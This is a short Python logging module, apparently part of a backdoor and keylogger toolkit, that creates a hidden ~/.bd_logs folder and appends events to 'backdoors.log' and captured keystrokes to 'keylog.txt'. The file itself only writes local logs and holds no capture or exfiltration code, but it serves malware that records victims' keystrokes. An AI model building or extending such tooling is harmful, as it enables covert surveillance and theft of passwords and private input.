# core/logger.py

import os
import datetime

LOG_DIR = os.path.expanduser("~/.bd_logs")

def setup_logger():
    if not os.path.exists(LOG_DIR):
        os.makedirs(LOG_DIR, exist_ok=True)

def log_event(event, data=""):
    setup_logger()
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    fname = os.path.join(LOG_DIR, "backdoors.log")
    with open(fname, "a", encoding="utf-8") as f:
        f.write(f"[{now}] {event}: {data}\n")

def log_keylog(tecla):
    setup_logger()
    fname = os.path.join(LOG_DIR, "keylog.txt")
    with open(fname, "a", encoding="utf-8") as f:
        f.write(tecla)

